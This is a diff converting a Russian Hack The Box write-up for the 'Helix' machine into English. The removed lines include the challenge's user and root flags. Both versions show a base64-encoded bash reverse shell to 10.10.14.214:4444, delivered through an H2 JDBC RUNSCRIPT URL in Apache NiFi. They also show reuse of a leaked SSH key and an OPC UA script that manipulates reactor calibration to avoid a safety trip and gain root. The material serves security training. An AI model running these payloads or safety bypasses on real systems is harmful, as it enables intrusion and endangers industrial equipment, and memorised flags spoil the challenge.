@@ -1,121 +1,213 @@
-```Shell
-┌──(neldi24㉿nelVM)-[~/Desktop]
-└─$ nmap -sSVC -A 10.129.245.123   
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-14 02:05 +07
-Nmap scan report for 10.129.245.123
-Host is up (0.22s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
-|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
-80/tcp open  http    nginx 1.18.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://helix.htb/
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.19
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# Helix Write-up
 
-TRACEROUTE (using port 1720/tcp)
-HOP RTT       ADDRESS
-1   217.61 ms 10.10.14.1
-2   217.67 ms 10.129.245.123
+> Hack The Box / CTF write-up  
+> Flags have been intentionally removed.
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.90 seconds
+## Enumeration
+
+I started with an Nmap scan against the target:
+
+```bash
+nmap -sSVC -A 10.129.245.123
 ```
 
-```Shell
-┌──(neldi24㉿nelVM)-[~/Desktop]
-└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \ 
-     -u http://helix.htb \
-     -H "Host: FUZZ.helix.htb" -ac
+The scan showed two open ports:
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://helix.htb
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.helix.htb
- :: Follow redirects : false
- :: Calibration      : true
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1349ms]
-:: Progress: [114442/114442] :: Job [1/1] :: 197 req/sec :: Duration: [0:09:56] :: Errors: 0 ::
+```text
+22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
+80/tcp open  http  nginx 1.18.0
 ```
-Находим сабдомен flow и переходим туда
 
-![[Pasted image 20260514002942.png]]
-Получаем Shell:
-1. Запустить слушатель
-```Shell
+The web server redirected to:
+
+```text
+http://helix.htb/
+```
+
+After adding the hostname to `/etc/hosts`, I enumerated virtual hosts with `ffuf`:
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+-u http://helix.htb \
+-H "Host: FUZZ.helix.htb" -ac
+```
+
+The scan discovered the following subdomain:
+
+```text
+flow.helix.htb
+```
+
+I added it to `/etc/hosts` and opened it in the browser.
+
+## Apache NiFi
+
+The `flow.helix.htb` virtual host exposed an Apache NiFi instance.
+
+Inside the NiFi interface, the flow contained processors including `LogAttribute` and `ExecuteSQL`.
+
+The `ExecuteSQL` processor could be configured to use a custom database connection pool, which made it possible to abuse the H2 JDBC driver and execute a remotely hosted SQL script.
+
+## Initial Foothold
+
+First, I started a Netcat listener:
+
+```bash
 nc -lvnp 4444
 ```
-2. Создай файл rce.sql:
-```SQL
-CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
+
+Then I created a file called `rce.sql`:
+
+```sql
+CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS
+$$//javascript
 java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}");
 $$--=x
 ```
-3. Запустить HTTP-сервер в папке с rce.sql:
-```Shell
+
+I served the file over HTTP:
+
+```bash
 python3 -m http.server 8000
 ```
-4. В NiFi UI сделать следующее:
-- Configure -> Перейти во вкладку **Controller Services** -> Нажать **+** → выбрать **DBCPConnectionPool** → Add.
-После чего его надо настроить так: 
-- Name: pwned (или любое)
-**Properties:**
-- **Database Driver Class Name**: org.h2.Driver
-- **Database Driver Location**: /opt/nifi-1.21.0/lib/h2-2.1.214.jar
-- **Database Connection URL**:
+
+### NiFi configuration
+
+In the NiFi web interface:
+
+1. Open **Configure**.
+2. Go to the **Controller Services** tab.
+3. Click **+**.
+4. Select **DBCPConnectionPool**.
+5. Add the service.
+
+I configured it with the following values:
+
+```text
+Name: pwned
+
+Database Driver Class Name:
+org.h2.Driver
+
+Database Driver Location:
+/opt/nifi-1.21.0/lib/h2-2.1.214.jar
+```
+
+For the database connection URL:
+
 ```text
 jdbc:h2:file:/tmp/pwn;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM 'http://10.10.14.214:8000/rce.sql'
 ```
-5. Включить (Enable) этот Controller Service
-6. Вернутся к процессору **ExecuteSQL** → Configure → в свойствах выбрать свой новый **DBCPConnectionPool** (pwned)
-7. Запустить процессор **ExecuteSQL** 
 
-Должно прилететь на nc.
-![[Pasted image 20260514012843.png]]
-```Shell
-find / -name "*support-bundle*" 2>/dev/null 
+After saving the configuration, I enabled the new Controller Service.
+
+Next:
+
+1. Open the `ExecuteSQL` processor.
+2. Choose **Configure**.
+3. Set its database connection pool to the newly created `pwned` service.
+4. Start the processor.
+
+The reverse shell connected back to the Netcat listener.
+
+Example:
+
+```text
+listening on [any] 4444 ...
+connect to [10.10.14.214] from (UNKNOWN) [10.129.245.123] ...
+bash: cannot set terminal process group
+bash: no job control in this shell
+nifi@helix:/opt/nifi-1.21.0$
+```
+
+The shell was running as the `nifi` user.
+
+## Operator SSH Key
+
+While enumerating the filesystem, I searched for NiFi support bundles:
+
+```bash
+find / -name "*support-bundle*" 2>/dev/null
+```
+
+The relevant directory was:
+
+```bash
+/opt/nifi-1.21.0/support-bundles/
+```
+
+I listed its contents:
+
+```bash
 ls -la /opt/nifi-1.21.0/support-bundles/
 ```
-Находим приватный ключ от оператора и копируем на свою машину
-![[Pasted image 20260514014114.png]]
-Используя ключ подключаемся к оператору 
-![[Pasted image 20260514014305.png]]
-Забираем user flag
-![[Pasted image 20260514014349.png]]
-User flag: `1396831e253050d8cae72d9c331a2a79`
 
-# Privilege Escalation 
-В домашнем каталоге пользователя operator мы нашли pdf с документацией, которую забрали себе 
-```Shell
-scp -i operator_key operator@flow.helix.htb:/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf
+A backup file containing the `operator` user's OpenSSH private key was present.
+
+I displayed the file and copied the private key to my attacking machine:
+
+```bash
+cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
 ```
-![[Pasted image 20260514014714.png]]
-Пароль от документа: operator1
 
-После чего используем payload и получаем root со второго шела:
-```Python
+On my machine, I saved the key as:
+
+```text
+operator_key
+```
+
+Then fixed its permissions:
+
+```bash
+chmod 600 operator_key
+```
+
+I connected to the target over SSH:
+
+```bash
+ssh -i operator_key operator@flow.helix.htb
+```
+
+This successfully provided a shell as:
+
+```text
+operator@helix:~$
+```
+
+The user flag was obtained at this stage, but its value is intentionally omitted from this public write-up.
+
+## Privilege Escalation
+
+In the `operator` user's home directory, I found a PDF document named:
+
+```text
+Operator Control & Safety Guide.pdf
+```
+
+I copied it to my machine:
+
+```bash
+scp -i operator_key \
+operator@flow.helix.htb:/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf .
+```
+
+The password for the document was:
+
+```text
+operator1
+```
+
+The documentation described the local industrial-control / OPC UA interface used by the system.
+
+The service was reachable locally at:
+
+```text
+opc.tcp://127.0.0.1:4840/helix/
+```
+
+Using this information, I created the following Python script:
+
+```python
 import asyncio
 from asyncua import Client, ua
 
@@ -126,49 +218,142 @@ async def main():
         ns = await c.get_namespace_index("urn:helix:ot")
         N = lambda i: c.get_node(f"ns={ns};i={i}")
 
-        # Узлы
         Mode, TestOv, Calib = N(12), N(13), N(6)
         Rods, Cooling, Reset = N(8), N(9), N(14)
         Temp, Trip = N(4), N(10)
 
-        print("[*] ШАГ 1: Аварийное охлаждение реактора...")
-        await Rods.write_value(ua.Variant(True, ua.VariantType.Boolean))
-        await Cooling.write_value(ua.Variant(True, ua.VariantType.Boolean))
-        await Calib.write_value(ua.Variant(0.0, ua.VariantType.Double)) # Сбрасываем офсет
-        
-        print("[*] Ждем падения температуры ниже 285...")
+        print("[*] STEP 1: Starting emergency reactor cooling...")
+
+        await Rods.write_value(
+            ua.Variant(True, ua.VariantType.Boolean)
+        )
+
+        await Cooling.write_value(
+            ua.Variant(True, ua.VariantType.Boolean)
+        )
+
+        # Reset calibration offset
+        await Calib.write_value(
+            ua.Variant(0.0, ua.VariantType.Double)
+        )
+
+        print("[*] Waiting for temperature to drop below 285...")
+
         while True:
             t = await Temp.read_value()
             tr = await Trip.read_value()
-            print(f"  > Текущая T: {t:.2f} | Trip: {tr}", end="\r")
+
+            print(
+                f" > Current T: {t:.2f} | Trip: {tr}",
+                end="\r"
+            )
+
             if t < 285:
                 break
+
             await asyncio.sleep(2)
 
-        print("\n[+] Температура в норме. Сбрасываем Trip...")
-        await Reset.write_value(ua.Variant(True, ua.VariantType.Boolean))
+        print("\n[+] Temperature is normal. Resetting Trip...")
+
+        await Reset.write_value(
+            ua.Variant(True, ua.VariantType.Boolean)
+        )
+
         await asyncio.sleep(1)
 
-        print("[*] ШАГ 2: Подготовка к открытию окна...")
-        await Mode.write_value(ua.Variant("MAINTENANCE", ua.VariantType.String))
-        await TestOv.write_value(ua.Variant(True, ua.VariantType.Boolean))
+        print("[*] STEP 2: Preparing maintenance window...")
 
-        print("[*] ШАГ 3: Финальный офсет (+20)...")
-        await Calib.write_value(ua.Variant(20.0, ua.VariantType.Double))
+        await Mode.write_value(
+            ua.Variant(
+                "MAINTENANCE",
+                ua.VariantType.String
+            )
+        )
+
+        await TestOv.write_value(
+            ua.Variant(True, ua.VariantType.Boolean)
+        )
+
+        print("[*] STEP 3: Applying final calibration offset (+20)...")
+
+        await Calib.write_value(
+            ua.Variant(20.0, ua.VariantType.Double)
+        )
+
         await asyncio.sleep(2)
 
         t = await Temp.read_value()
         tr = await Trip.read_value()
+
         if t >= 295 and not tr:
-            print(f"\n[!!!] УСПЕХ! T={t:.2f}, Trip={tr}")
-            print("[!!!] БЕГИ В ТЕРМИНАЛ И ПИШИ: sudo /usr/local/sbin/helix-maint-console")
-            while True: await asyncio.sleep(10)
+            print(
+                f"\n[!!!] SUCCESS! T={t:.2f}, Trip={tr}"
+            )
+
+            print(
+                "[!!!] Run in another terminal: "
+                "sudo /usr/local/sbin/helix-maint-console"
+            )
+
+            while True:
+                await asyncio.sleep(10)
+
         else:
-            print(f"\n[-] Что-то пошло не так: T={t:.2f}, Trip={tr}")
+            print(
+                f"\n[-] Conditions not met: "
+                f"T={t:.2f}, Trip={tr}"
+            )
 
 asyncio.run(main())
 ```
-![[Pasted image 20260514131153.png]]
 
-![[Pasted image 20260514131225.png]]
-Root flag `339dfc903ead867f89757da374606ebb`
+I saved the script on the target, for example as:
+
+```bash
+nano /tmp/exploit.py
+```
+
+Then executed it:
+
+```bash
+python3 /tmp/exploit.py
+```
+
+The script first forced the reactor into a safe state by enabling the rods and cooling, resetting the calibration offset, and waiting until the temperature dropped below the required threshold.
+
+Example output:
+
+```text
+[*] STEP 1: Starting emergency reactor cooling...
+[*] Waiting for temperature to drop below 285...
+ > Current T: 283.82 | Trip: False
+[+] Temperature is normal. Resetting Trip...
+[*] STEP 2: Preparing maintenance window...
+[*] STEP 3: Applying final calibration offset (+20)...
+
+[!!!] SUCCESS! T=303.91, Trip=False
+[!!!] Run in another terminal: sudo /usr/local/sbin/helix-maint-console
+```
+
+Once the required conditions were met, I opened another terminal and ran:
+
+```bash
+sudo /usr/local/sbin/helix-maint-console
+```
+
+The console reported that privileged maintenance access had been granted:
+
+```text
+[+] Privileged maintenance access granted
+[!] Window expires in 109 seconds
+[!] Session will be terminated automatically
+```
+
+This resulted in a root shell:
+
+```text
+root@helix:/home/operator#
+```
+
+
+
